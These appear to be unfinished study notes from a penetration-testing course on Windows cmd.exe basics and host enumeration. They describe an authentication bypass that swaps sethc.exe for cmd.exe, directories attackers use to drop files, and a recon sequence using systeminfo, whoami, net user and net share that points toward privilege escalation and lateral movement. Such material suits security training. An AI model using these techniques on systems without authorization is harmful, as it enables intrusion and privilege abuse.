
The built-in command shell `cmd.exe` and PowerShell are two implementations included in windows hosts. These tools provide direct access to OS automate routine tasks and provide user with granular control of any aspect of computer and installed applications.

### Command Prompt vs Powershell

One key difference is that you can run Command Prompt commands from a PowerShell console, but to run PowerShell commands from a Command Prompt, you would have to preface the command with `powershell` (i.e., `powershell get-alias`). The following table outlines some other key differences.

|PowerShell|Command Prompt|
|---|---|
|Introduced in 2006|Introduced in 1981|
|Can run both batch commands and PowerShell cmdlets|Can only run batch commands|
|Supports the use of command aliases|Does not support command aliases|
|Cmdlet output can be passed to other cmdlets|Command output cannot be passed to other commands|
|All output is in the form of an object|Output of commands is text|
|Able to execute a sequence of cmdlets in a script|A command must finish before the next command can run|
|Has an Integrated Scripting Environment (ISE)|Does not have an ISE|
|Can access programming libraries because it is built on the .NET framework|Cannot access these libraries|
|Can be run on Linux systems|Can only be run on Windows systems|

# Command Prompt Basics


The first step down the rabbit hole to developing our command-line kung fu is to dive into `cmd.exe`(the Command Prompt application). 

## CMD.exe

The Command Prompt, also known as [cmd.exe](https://https//learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd) or CMD, is the default command line interpreter for the Windows operating system. Originally based on the [COMMAND.COM](https://www.techopedia.com/definition/1360/commandcom) interpreter in DOS, the Command Prompt is ubiquitous across nearly all Windows operating systems. It allows users to input commands that are directly interpreted and then executed by the operating system. A single command can accomplish tasks such as changing a user's password or checking the status of network interfaces. This also reduces system resources, as graphical-based programs require more CPU and memory.

## Accessing CMD

There are multiple ways to access command prompt 

#### Local Access vs Remote Access

### Local Access

Local access is synonymous with having direct physical access to machine itself. This level of access does not require machine to be connected to network as it is accessed directly through peripherals connected to machine

### Remote Access

Remote access is equivalent of accessing the machine using virtual peripherals over network. The level of access does not require direct physical access to machine but requires user to be  connected to same network or have a route to machine they intent to access remotely.

We can access remote machine using `telnet`, `secureshell`, `PsExec`, `WinRM`,`RDP` or other protocol as needed.

For a sysadmin remote management and access are a boon to our workflow. We would not have to go to the user's desk physically access the host to perform our duties.the same thing can become a threat if not configured correctly.

### Basic Usage
Command prompt remained same for most of its time.

#### Case Study: Windows Recovery

In the event of a user lockout or some technical issue preventing/ inhibiting regular use of the machine, booting from a Windows installation disc gives us the option to boot to `Repair Mode`
From here, the user is provided access to a Command Prompt, allowing for command-line-based troubleshooting of the device.

While useful, this also poses a potential risk. For example, on this Windows 7 machine, we can use the recovery Command Prompt to tamper with the filesystem. Specifically, replacing the `Sticky Keys` (`sethc.exe`) binary with another copy of `cmd.exe`

Once the machine is rebooted, we can press `Shift` five times on the Windows login screen to invoke `Sticky Keys`. Since the executable has been overwritten, what we get instead is another Command Prompt - this time with `NT AUTHORITY\SYSTEM` permissions. We have bypassed any authentication and now have access to the machine as the super user.


# Getting Help

The Command Prompt has a built-in `help` function that can provide us with detailed information about the available commands on our system and how to utilize those functions. In this section, we are going to cover the following in greater detail:

- How do we utilize the help functionality within Command Prompt?
- Why utilizing the help functionality is essential?
- Where can we find additional external resources for help?
- How to utilize additional tips and tricks in the Command Prompt?
  
### How to get Help?

Similar to Linux terminal, Windows command prompt have built in `help` command

#### How to Get Help

When first looking at the Command Prompt interface, it can be overwhelming to stare at a blank prompt. Some initial questions might emerge, such as:

- What commands do I have access to?
- How do I use these commands?
  
  
#### Help with Commands

```cmd-session
C:\htb> help time

Displays or sets the system time.

TIME [/T | time]

Type TIME with no parameters to display the current time setting and a prompt
for a new one. Press ENTER to keep the same time.

If Command Extensions are enabled, the TIME command supports
the /T switch which tells the command to just output the
current time, without prompting for a new time.
```

As we can see from the output above, when we issued the command `help time`, it printed the help details for time. This will work for any system command built-in but not for every command accessible on the system. Certain commands do not have a help page associated with them. However, they will redirect you to running the proper command to retrieve the desired information. For example, running `help ipconfig` will give us the following output.

Be aware that several commands use the `/?` modifier interchangeably with help.

>Why does the help utility exist, and what use does it serve today when access to the Internet is so prevalent?
>
>Imagine that you are tasked to assist in an internal on-site engagement for your company `GreenHorn`. You are immediately dropped into a Command Prompt session on a machine from within the internal network and have been tasked with enumerating the system. As per the rules of engagement, you have been stripped of any devices on your person and told that the firewall is blocking all outbound network traffic. You begin your enumeration on the system but need help remembering the syntax for a specific command you have in mind. You realize that you cannot reach the Internet by any means. `Where can you find it?`'

Although this scenario might seem slightly exaggerated, there will be scenarios similar to this one as an `attacker` where our network access will be heavily limited, monitored, or strictly unavailable. Sometimes, we do not have every command and all parameters and syntax memorized; however, we will still be expected to perform even under these limitations. Instances like this are where `help` utility comes to save.

>Why does the help utility exist?
>The help utility serves as offline manual for `cmd` and `DOS`compatible Windows operating system commands. `offline` refers to the fact that this utility can be used on system without network access. This help utility is very similar to `Man` pages on linux based systems.

What use does it serve today when access to the Internet is so prevalent?
This `help` utility is meant to bridge that gap when we need assistance with commands or specific syntax for said commands on our system and may not have external resources available to ask for help.

`Microsoft Documentation` has a complete listing of commands that can be issued within command-line interpreter as well as detailed descriptions of how to use them.

`ss64` is handy quick reference anything command-line related,including cmd,PowerShell,Bash.

  
#### Clear Your Screen
Similar to linux you can clear the output you can use `cls` command to clear out our previous results. 

#### History
Although the output is cleared we can use `/history` to fetch the previous commands. This is due to nifty feature built into command prompt known as command history similar to linux.

Command history is dynamic thing. It allows us to view previously ran commands in our command prompt's current active session.

Another way to view our history is command `doskey /history.`  `Doskey` is an MS-DOS utility that keeps a history of commands issued and allows to be referenced again.


#### doskey /history

From the output provided above, we can view a list of `commands` that were run before our original command. This is important and incredibly useful, especially if you are constantly clearing your screen and need to rerun a previous command to collect its `output`. Interacting and viewing all previously run commands will save you extra time, energy, and heartache.

#### Useful Keys & Commands for Terminal History

It would be helpful to have some way of remembering some of the key functionality provided by our terminal history. With this in mind, the table below shows a list of some of the most valuable functions and commands that can be run to interact with our session history. This list is not exhaustive. For example, the function keys F1 - F9 all serve a purpose when working with history.

| **Key/Command** | **Description**                                                                                                            |
| :-------------: | -------------------------------------------------------------------------------------------------------------------------- |
| doskey /history | doskey /history will print the session's command history to the terminal or output it to a file when specified.            |
|     page up     | Places the first command in our session history to the prompt.                                                             |
|    page down    | Places the last command in history to the prompt.                                                                          |
|        ⇧        | Allows us to scroll up through our command history to view previously run commands.                                        |
|        ⇩        | Allows us to scroll down to our most recent commands run.                                                                  |
|        ⇨        | Types the previous command to prompt one character at a time.                                                              |
|        ⇦        | N/A                                                                                                                        |
|       F3        | Will retype the entire previous entry to our prompt.                                                                       |
|       F5        | Pressing F5 multiple times will allow you to cycle through previous commands.                                              |
|       F7        | Opens an interactive list of previous commands.                                                                            |
|       F9        | Enters a command to our prompt based on the number specified. The number corresponds to the commands place in our history. |

#### Exit a Running Process

At some point in our journey working with the `Command Prompt`, there will be times when we will need to be able to `interrupt` an actively running process, effectively killing it.When running a command or process we want to interrupt, we can do so by pressing the `ctrl+c` key combination

---
# System Navigation

---

So far, most of what we have covered is introductory information to help us get a basic understanding and feel of the Command Prompt. Continuing with that flow, our next goal should be utilizing our Command Prompt to successfully `navigate` and move around on the system. In this section, we attempt to conquer our surroundings by:

- Listing A Directory
- Finding Our Place on the System
- Moving Around using CD
- Exploring the File System

### Listing a directory
  
`Dir` is the command used to list the contents of folder in windows.


### Finding Our Place

Before doing anything on a host, it is helpful to know where we are in the filesystem. We can determine that by utilizing the `cd` or `chdir` commands.

you can get to the current location and also traverse to the directory you want.

```cmd
C:\Desktop> cd\chdir <destination_path>
```

>**Note:** `C:\` is the root directory of all Windows machines and has been determined so since it is inception in the MS-DOS and Windows 3.0 days. The "C:\" designation was used commonly as typically "A:\" and "B:\" were recognized as floppy drives, whereas "C:\" was recognized as the first internal hard drive of the machine.


#### Absolute Path

```cmd-session
C:\htb> cd C:\Users\htb\Pictures

C:\Users\htb\Pictures> 

```

In this example, we can see that our initial working directory is located in `C:\htb`. We used `cd` and provided the path as our argument to move ourselves to the `C:\Users\htb\Pictures` directory. As we can see, the provided path starts with `C:\` as it is the root directory and follows the structure until it reaches its destination, being the `\Pictures` directory. Putting the pieces together, we can conclude that `C:\Users\htb\Pictures` would be considered the `absolute path` in this case as it follows the complete structure of the file system starting from the `root` directory and ending at the destination directory.

#### Relative Path

```cmd-session
C:\htb> cd .\Pictures

C:\Users\htb\Pictures> 

```

On the other hand, following this example, we can see that something is slightly off in how our path is specified in the `cd` command. Instead of starting from the `root` directory, we are greeted with a `.` followed by the destination directory (`\Pictures`). The `.` character points to one directory down from our current working directory (`C:\htb`). Using our working directory as the starting point to reference directories either above it or below it in the file system hierarchy is considered a `relative path`, as its position is relative to the current working directory.

#### Exploring the File System

Thorough exploration is essential, as it can help us gain a considerable advantage in understanding the layout of the system we are interacting with and the files contained within. However, when looking around the filesystem of a Windows host, it can get tedious to change our directory back and forth or to issue the `dir` command for each sub-directory. To save us a bit of time and gain some efficiency, we can get a printout of the entire path we specify and its subdirectories by utilizing the `tree` command.

#### Listing the Contents of the File System

```cmd-session
C:\htb\student\> tree

Folder PATH listing
Volume serial number is 26E7-9EE4
C:.
├───3D Objects
├───Contacts
├───Desktop
├───Documents
├───Downloads
├───Favorites
    └───Links
```

We can utilize the `/F` parameter with the tree command to see a listing of each file and the directories along with the directory tree of the path.

#### Tree /F

```cmd-session
C:\htb\student\> tree /F

Folder PATH listing
Volume serial number is 26E7-9EE4
C:.
├───3D Objects
├───Contacts
├───Desktop
│       passwords.txt.txt
│       Project plans.txt
│       secrets.txt
│
├───Documents
├───Downloads
├───Favorites
│   │   Bing.URL
│   │
    └───Links
```

For now, be aware that after attempting to run this command, we should probably interrupt its execution using `Ctrl-C` after retrieving the desired information.

#### Interesting Directories

Navigating the system should be much more approachable now than initially seemed. Let us take a minute to discuss some directories that can come in handy from an attacker's perspective on a system. Below is a table of common directories that an attacker can abuse to drop files to disk, perform reconnaissance, and help facilitate attack surface mapping on a target host.

| Name:               | Location:                            | Description:                                                                                                                                                                                                                                                                     |
| ------------------- | ------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| %SYSTEMROOT%\Temp   | `C:\Windows\Temp`                    | Global directory containing temporary system files accessible to all users on the system. All users, regardless of authority, are provided full read, write, and execute permissions in this directory. Useful for dropping files as a low-privilege user on the system.         |
| %TEMP%              | `C:\Users\<user>\AppData\Local\Temp` | Local directory containing a user's temporary files accessible only to the user account that it is attached to. Provides full ownership to the user that owns this folder. Useful when the attacker gains control of a local/domain joined user account.                         |
| %PUBLIC%            | `C:\Users\Public`                    | Publicly accessible directory allowing any interactive logon account full access to read, write, modify, execute, etc., files and subfolders within the directory. Alternative to the global Windows Temp Directory as it's less likely to be monitored for suspicious activity. |
| %ProgramFiles%      | `C:\Program Files`                   | folder containing all 64-bit applications installed on the system. Useful for seeing what kind of applications are installed on the target system.                                                                                                                               |
| %ProgramFiles(x86)% | `C:\Program Files (x86)`             | Folder containing all 32-bit applications installed on the system. Useful for seeing what kind of applications are installed on the target system.                                                                                                                               |


## Working with Directories and Files - CMD

## Directories
- The Drive itself is a disk, but it is also the root directory. So think about the `C:` drive as our hotel.
- That hotel has many different floors filled with hallways. This level would include directories like `Windows`, `Users`, `Program Files`, and any other directories created by the operating system or the users.
- These floors have multiple halls. Think of each hall as a folder nested with our previous directories. So for the case of Users, we would then have a folder for each user logged into the host. At this point, we are several levels deep into the filesystem. (C:\Users\htb) as an example of a directory.
- This continues with other hallways (directories) as the use of the host expands and more software is installed.
- Eventually, we find the room we were looking for and peek in. Think of the door as a file within the directory hive.
  
### Viewing & Listing Directories
 We can issue the 'cd' command when trying to see what directory we currently reside in. To get a listing of what files are within a directory, we can use the `dir` command, and `tree` provides a complete listing of all files and folders within the specified path.
 
 > Create a New Directory

#### Using MD & Mk-Dir

Both  `md` &`mkdir` are used to make new directories.

##### Delete Directories

Deleting can be accomplished using `rd` or `rmdir` commands. The commands `rd` and `rmdir` are explicitly meant for removing directory tree and do not deal with specific files or attributes.

##### Modifying
Modifying a directory is more complicated than changing a file. The directory holds data within it for other files or directories. We have several options in any case. `Move`, `Robocopy`, and `xcopy` can copy and make changes to directories and their structures.

To use `move`, we have to issue the syntax in this order. When moving directories, it will take the directory and any files within and move it from the `source` to the `destination` path specified.


### Move a directory

We ran the tree command to see what resided in the example directory before copying it. After that, executing `move example C:\Users\htb\Documents\example` placed the example directory and all its files into the user's Documents folder. We can validate this by running a dir on Documents to see if the directory exists.

Moreover, there we have it. The directory `example` exists now within the Documents directory. The following two options have more capability in the ways they can interact with files and directories. We will take a minute to look at `xcopy` since it still exists in current Windows operating systems, but it is essential to know that it has been deprecated for `robocopy`. Where xcopy shines is that it can remove the Read-only bit from files when moving them. The syntax for `xcopy` is `xcopy` `source` `destination` `options`. As it was with move, we can use wildcards for source files, not destination files.

### Using Xcopy

Xcopy prompts us during the process and displays the result. In our case, the directory and any files within were copied to the Desktop. Utilizing the `/E` switch, we told Xcopy to copy any files and subdirectories to include empty directories. Keep in mind this will not delete the copy in the previous directory. When performing the duplication, xcopy will reset any attributes the file had. If you wish to retain the file's attributes ( such as read-only or hidden ), you can use the `/K` switch.

Note: Xcopy isn't silent like Robocopy it prompts user to enter.

### Robocopy

`Robocopy` is xcopy's successor built with much capability.It can copy and move files locally to different drives even across a network while retaining file data and attributes to include timestamps, ownerships, ACL's and any flag set like hidden or read-only. Robocopy is an enterprise grade tool

Robocopy can also work with system, read-only, and hidden files. As a user, this can be problematic if we do not have the `SeBackupPrivilege` and `auditing privilege` attributes. This could stop us from duplicating or moving files and directories. There is a bit of a workaround, however. We can utilize the `/MIR` switch to permit ourselves to copy the files we need temporarily.

### Files
Many of same commands we utilised while administering directories  can also be used with files.

##### List Files & View their Contents 

Similar to `dir` and `tree`, the other is `more` we can view the contents of file or results of another command printed to it one screen at time. It's like buffer scrolling text.

#### More /S

# << Work In Progress >>


## Gathering System Information

Command Prompt let us move on to a fundamental concept accessible to both System administrators and Penetration Testers: Gathering System Information.

Gathering System Information(commonly referred as Host Enumeration) may seem daunting at first, However it is important step in providing good foundation  for getting to know environment. Learning the environment and getting to know about the systems is beneficial for both `Red` team and `Blue` team..

Red Teamers will find it value in being able to scan their hosts and environments to learn what vulnerable services and machines can be exploited, Whereas the Blue Teamers can use the information to diagnose the issues, secure hosts and services and ensure integrity across network.

### What Types of Info can we gathered from System?

Once we get access through some command shell. Manually enumerating the system with no path in mind on how we wish to proceed results in hours of lost time. The goal of host enum is to get overall picture of target host, its env and how it interacts across network.

![[Pasted image 20250629080041.png]]

| Type                         | Description                                                                                                                                                                                                                                                                                                                                              |
| ---------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `General System Information` | Contains information about the overall target system. Target system information includes but is not limited to the `hostname` of the machine, OS-specific details (`name`, `version`, `configuration`, etc.), and `installed hotfixes/patches` for the system.                                                                                           |
| `Networking Information`     | Contains networking and connection information for the target system and system(s) to which the target is connected over the network. Examples of networking information include but are not limited to the following: `host IP address`, `available network interfaces`, `accessible subnets`, `DNS server(s)`, `known hosts`, and `network resources`. |
| `Basic Domain Information`   | Contains Active Directory information regarding the domain to which the target system is connected.                                                                                                                                                                                                                                                      |
| `User Information`           | Contains information regarding local users and groups on the target system. This can typically be expanded to contain anything accessible to these accounts, such as `environment variables`, `currently running tasks`, `scheduled tasks`, and `known services`.                                                                                        |
|                              |                                                                                                                                                                                                                                                                                                                                                          |
Every single piece of data in a system provide us with means to begin creating a solid methodology for enums. To keep ourselves focused on target during enum we can ask for following questions.

- What system information can we pull from our target host?
- What other system(s) is our target host interacting with over the network?
- What user account(s) do we have access to, and what information is accessible from the account(s)?
  
### Why do we need this information?

Our primary goal with host enum is to use info gained from target to provide us with starting point and guide for how we wish to attack the system.To gain a better grasp on concept behind importance of proper host enum consider the example

> Ex: Imagine you are tasked with working on an `assumed breach` engagement and have been provided with initial access through what is assumed to be an unprivileged user account. Your task is to get an overall lay of the land and see if you can `escalate your privileges` beyond the initial access of the compromised user account.


Following this example we can see that we are provided  a direct access to initial host through an unprivileged user account.However the goal is perform vertical escalation and gain highest possible privileges.o do this, we are going to need a thorough understanding of our environment, including the following:

- What user account do we have access to?
- What groups does our user belong to?
- What current working set of privileges does our user have access to?
- What resources can our user access over the network?
- What tasks and services are running under our user account?
  
### How Do We Get This Information?

#### Casting a Wide Net

CMD provides a one stop info with `systeminfo` command.It is excellent for finding relevant info about the host,such as hostname, IP, if it belongs to domain , what hotfixes have been installed and else. (Sysadmin uses this info to diagnose in-case of issues.)

For a hacker, this is a great way to quickly get the lay of the land when you first access a host while leaving a minimal footprint. Running one command is always better than running two or three just to get the same information. We are less likely to be detected this way. Having quick access to things such as the OS version, hotfixes installed, and OS build version can help us quickly determine from a quick Google or [ExploitDB](https://www.exploit-db.com/) search, if an exploit exists that can be quickly leveraged to exploit this host further, elevate privileges, and more.

```cmd-session
Systeminfo Output
Host Name:                 DESKTOP-htb
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19042 N/A Build 19042
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
```

#### Examining the System

`systeminfo` contains a lot of information to sift through; however, if we need to retrieve some basic system information such as the `hostname` or `OS version`, we can use the `hostname` and `ver` utilities built into the command prompt.

The [hostname](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/hostname) utility follows its namesake and provides us with the hostname of the machine, whereas the [ver](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ver) command prints out the current operating system version number. Both commands, in tandem, will provide us with an alternative way to retrieve some basic system information we can use while further enumerating the target host.

#### Hostname Output

```cmd-session
C:\htb> hostname

DESKTOP-htb
```

#### Ver Output

```cmd-session
C:\htb> ver

Microsoft Windows [Version 10.0.19042.2006]
```

### Scoping the Network

In addition to host info provided, let us look for some basic network info for target. A thorough understanding of how our target is connected and what devices it can access across the network is an invaluable tool in our arsenal as attacker.

To gather these type of information we can utilise `ipconfig` utility. It displays all current TCP/IP network configs for machine.

`Ipconfig` is a highly versatile command for gathering information about the network connectivity of the target host; however, if we need to quickly see what hosts our target has come into contact with, look no further than the `arp` command.

The [arp](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/arp) utility effectively displays the contents and entries contained within the Address Resolution Protocol (`ARP`) cache. We can also use this command to modify the table entries effectively. However, that in itself is beyond the scope of this module. To better understand what type of information the `ARP` cache contains, let us quickly look at the following example:

#### Utilizing ARP to Find Additional Hosts

```cmd-session
C:\htb> arp /a

<SNIP>

Interface: 10.0.25.17 --- 0x17
  Internet Address      Physical Address      Type
  10.0.25.1             00-e0-67-15-cf-43     dynamic
  10.0.25.5             54-9f-35-1c-3a-e2     dynamic
  10.0.25.10            00-0c-29-62-09-81     dynamic
  10.0.25.255           ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static

Interface: 172.16.50.15 --- 0x1a
  Internet Address      Physical Address      Type
  172.16.50.1           15-c0-6b-58-70-ed     dynamic
  172.16.50.20          80-e5-53-3c-72-30     dynamic
  172.16.50.32          fb-90-01-5c-1f-88     dynamic
  172.16.50.65          7a-49-56-10-3b-76     dynamic
  172.16.50.255         ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static\

<SNIP>
```



### Understanding the current user

Now that we have some basic host info we should further understand our current compromised user account. One of best command line utilities to do is `whoami`

`whoami` allows us to display the user, group and privilege information for user that is currently logged in .

In this case, we should run it without any parameters first and see what kind of output we end up with.

```cmd-session
C:\htb> whoami

ACADEMY-WIN11\htb-student
```

As we can see from the initial output above, running `whoami` without parameters provides us with the current domain and the user name of the logged-in account.

**Note:** If the current user is not a domain-joined account, the `NetBIOS` name will be provided instead. The current `hostname` will be used in most cases.

#### Checking out our privileges 

As previously mentioned , we can also use `whoami`  to view our current user's security privileges on system. By understanding what privileges are enabled for our current user, we can determine our capabilities on target host.

let's try `whoami /priv` from compromised user acc

```cmd-session
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ============================= ========
SeShutdownPrivilege           Shut down the system               Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeUndockPrivilege           Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set     Disabled
SeTimeZonePrivilege           Change the time zone               Disabled
```

From the output above, we only seem to have access to a basic permission set, and most of our options are disabled. This falls within the limitations of a standard user account provisioned on the domain. However, if there were any misconfigurations in these settings or the user was provided any additional privileges, we could potentially use this to our advantage in trying to escalate the privileges of our current user.

#### Investigating Groups

On top of having a thorough understanding of our current user's privileges, we should also take some time to see what groups our account is a member of. This can provide insight into other groups our current user is a part of, including any default groups (built-ins) and, more importantly, any custom groups to which our user was explicitly granted access. To view the groups our current user is a part of, we can issue the following command: `whoami /groups`.

```cmd-session
C:\htb> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ 
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group

BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group

BUILTIN\Performance Log Users          Alias            S-1-5-32-559 Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group

CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group

LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group

Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

Our user is not a member of any other groups besides the built-ins added to our account upon creation. However, it is essential to note that in some cases, users can be provided additional access, privileges, and permissions based on the groups to which they belong.

**Note:** The commands shown above contain only certain sections of the output provided from `whoami /all`. Depending on the situation and the information that's needed, we can use the individual commands or gather all of the information at once through the use of the `/all` parameter.

#### Investigating Other Users/Groups

After investigating our current compromised user account, we need to branch out a bit and see if we can get access to other accounts. In most environments, machines on a network are domain-joined. Due to the nature of domain-joined networks, anyone can log in to any physical host on the network without requiring a local account on the machine. We can use this to our advantage by scoping out what users have accessed our current host to see if we could access other accounts. This is very beneficial as a method of maintaining persistence across the network. To do this, we can utilize specific functionality of the `net` command.

#### Net User

[Net User](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771865\(v=ws.11\)) allows us to display a list of all users on a host, information about a specific user, and to create or delete users.

```cmd-session
C:\htb> net user

User accounts for \\ACADEMY-WIN11

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
htb-student              WDAGUtilityAccount
The command completed successfully.
```

#### Net Group / Localgroup

In addition to user accounts, we should also take a quick look into what groups exist across the network. In the previous section, we discussed very heavily into groups that our user is a member of; however, we also have the capability from our current host to view all groups that exist on our host and from the domain. We can achieve this by utilizing the `net group` and `net localgroup` commands.

[Net Group](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754051\(v=ws.11\)) will display any groups that exist on the host from which we issued the command, create and delete groups, and add or remove users from groups. It will also display domain group information if the host is joined to the domain. Keep in mind, `net group` must be run against a domain server such as the DC, while `net localgroup` can be run against any host to show us the groups it contains.

```cmd-session
C:\htb> net group
net group
This command can be used only on a Windows Domain Controller.

More help is available by typing NET HELPMSG 3515.


C:\htb>net localgroup

Aliases for \\ACADEMY-WIN11

-------------------------------------------------------------------------
*__vmware__
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Cryptographic Operators
*Device Owners
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Remote Desktop Users
*Remote Management Users
*Replicator
*System Managed Accounts Group
*Users
The command completed successfully.

```

### Exploring Resources on Network

Previously we honed in on what out current user has access to in terms of host locally. However in a domain environment users are typically required to store any work-related material on share located on network versus storing files locally on their machine. These shares are usually found on server away from physical access pf run-of-mill employee. Typically standard users will have necessary permissions to read, write and execute files from a share, provided they  have valid credentials.

#### Net Share

One way of doing so involves using the `net share` command. Net Share allows us to  display info about shared resources on host and to create new shared resources as well,

```cmd-session
C:\htb> net share  

Share name   Resource                        Remark

-------------------------------------------------------------------------------
C$           C:\                             Default share
IPC$                                         Remote IPC
ADMIN$       C:\Windows                      Remote Admin
Records      D:\Important-Files              Mounted share for records storage  
The command completed successfully.
```

As we can see from the example above, we have a list of shares that our current compromised user has access to. By reading the remarks, we can take an educated guess that `Records` is a manually mounted share that could contain some potentially interesting information for us to enumerate. Ideally, if we were to find an open share like this while on an engagement, we would need to keep track of the following:

- Do we have the proper permissions to access this share?
- Can we read, write, and execute files on the share?
- Is there any valuable data on the share?
  
In addition to providing information, `shares` are great for hosting anything we need and laterally moving across hosts as a pentester. If we are not too worried about being sneaky, we can drop a payload or other data onto a share to enable movement around other hosts on the network. Although outside of the scope of this module, abusing shares in this manner is an excellent persistence method and can potentially be used to escalate privileges.

#### Net View

If we are not explicitly looking for shares and wish to search the environment broadly, we have an alternate command that can be extremely useful, also known as `net view`.

[Net View](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh875576\(v=ws.11\)) will display to us any shared resources the host you are issuing the command against knows of. This includes domain resources, shares, printers, and more.

----

## Finding files and Directories

Now, we covered creating modifying , moving and deleting files and directories. We should cover a beneficial concept that can make or break it during an engagement or in our day-to-day tasks as System Administrator or Pentester known as `Enmeration`. This section will cover how to search for particular files and directories utilising CMD why enumerating system files and directories are vital and provide an essential list of what to look out for while enumerating the system.


#### Searching with CMD

###### Using Where

```cmd-session
C:\Users\student\Desktop>where calc.exe

C:\Windows\System32\calc.exe

C:\Users\student\Desktop>where bio.txt

INFO: Could not find files for the given pattern(s).
```

Above, we can see two different tries using the `where` command. First, we searched for `calc.exe`, and it completed showing us the path for calc.exe. This command worked because the system32 folder is in our environment variable path, so the `where` command can look through those folders automatically.

The second attempt we see failed. This is because we are searching for a file that does not exist within that environment path. It is located within our user directory. So we need to specify the path to search in, and to ensure we dig through all directories within that path, we can use the `/R` switch.

#### Recursive Where

```cmd-session
C:\Users\student\Desktop>where /R C:\Users\student\ bio.txt

C:\Users\student\Downloads\bio.txt
```

Above, we searched recursively, looking for bio.txt. The file was found in the `C:\Users\student\Downloads\` folder. The `/R` switch forced the `where` command to search through every folder in the student user directory hive. On top of looking for files, we can also search wildcards for specific strings, file types, and more. Below is an example of searching for the `csv` file type within the student directory.

#### Using Wildcards

```cmd-session
C:\Users\student\Desktop>where /R C:\Users\student\ *.csv

C:\Users\student\AppData\Local\live-hosts.csv
```

We used `where` to give us an idea of how to search for files and applications on the host. Now, let us talk about `Find`. Find is used to search for text strings or their absence within a file or files. You can also use `find` against the console's output or another command. Where `find` is limited, however, is its capability to utilize wildcard patterns in its matching. The example below will show us a simple search with Find against the not-password.txt file.

#### Basic Find
```cmd-session
C:\Users\student\Desktop> find "password" "C:\Users\student\not-passwords.txt" 
```

We can modify the way `find` searches using several switches. 

### **Key Switches**

|Switch|Description|
|---|---|
|`/V`|Displays all lines **not containing** the specified string (NOT clause)|
|`/N`|Displays **line numbers** alongside each matching line|
|`/I`|**Ignores case sensitivity** in search|
### **Example**
In the example below, we use all of the modifiers to show us any lines that do not match the string `IP Address` while asking it to display line numbers and ignore the case of the string.
```
find /V /N /I "IP Address" file.txt
```
**Explanation:**

- **`/V`**: Show lines that **do not** match "IP Address"
- **`/N`**: Display **line numbers**
- **`/I`**: Ignore **case sensitivity**

For quick searches, find is easy to use, but it could be more robust in how it can search. However, if we need something more specific, `findstr` is what we need. The `findstr` command is similar to `find` in that it searches through files but for patterns instead. It will look for anything matching a pattern, regex value, wildcards, and more. Think of it as find2.0. For those familiar with Linux, `findstr` is closer to `grep`.

#### Findstr

```cmd-session
C:\Users\student\Desktop> findstr  
```

### Evaluating and Sorting Files

We have seen how to work with, search for certain files and search for strings inside files. Additionally, we have also learned how to create and modify files. Now let us discuss a few options to evaluate those files and compare them against each other. The [comp](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/comp), [fc](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/fc), and [sort](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sort) commands are how we will accomplish this.

`Comp` will check each byte within two files looking for differences and then displays where they start. By default, the differences are shown in a decimal format. We can use the `/A` modifier if we want to see the differences in ASCII format. The `/L` modifier can also provide us with the line numbers.

#### Compare

```cmd-session
C:\Users\student\Desktop> comp .\file-1.md .\file-2.md

Comparing .\file-1.md and .\file-2.md...
Files compare OK  
```

Above, we see the comparison come back OK. The files are the same. We can use this as an easy way to check if any scripts, executables, or critical files have been modified. Below we have output from a file that's been changed.

```powershell-session
PS C:\htb> echo a > .\file-1.md
PS C:\Users\MTanaka\Desktop> echo a > .\file-2.md
PS C:\Users\MTanaka\Desktop> comp .\file-1.md .\file-2.md /A
Comparing .\file-1.md and .\file-2.md...
Files compare OK
<SNIP>
